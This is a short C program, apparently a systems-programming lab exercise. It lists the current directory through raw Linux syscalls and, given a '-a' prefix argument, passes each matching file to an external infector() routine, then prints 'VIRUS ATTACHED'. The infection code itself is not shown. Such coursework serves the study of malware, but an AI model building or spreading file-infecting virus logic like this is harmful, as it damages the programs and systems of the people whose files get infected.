#include "Util.h"

#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141
#define SYS_EXIT 1
#define STDOUT 1
#define STDERR 2
#define BUF_SIZE 8192

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

extern int system_call();
extern void infection();
extern void infector(char *file);

int main(int argc, char *argv[], char *envp[]) {
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int fd, nread, bpos;

    fd = system_call(SYS_OPEN, ".", 0, 0777);
    if (fd < 0) {
        system_call(SYS_WRITE, STDERR, "Error: Cannot open directory\n", 29);
        system_call(SYS_EXIT, 0x55);
    }

    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_WRITE, STDERR, "Error: Cannot read directory\n", 29);
        system_call(SYS_EXIT, 0x55);
    }

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *)(buf + bpos);
        system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
        system_call(SYS_WRITE, STDOUT, "\n", 1);

        if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a') {
            char *prefix = argv[1] + 2;
            if (strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
                infector(d->d_name);
                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED\n", 15);
            }
        }
        bpos += d->d_reclen;
    }

    system_call(SYS_CLOSE, fd);
    return 0;
}
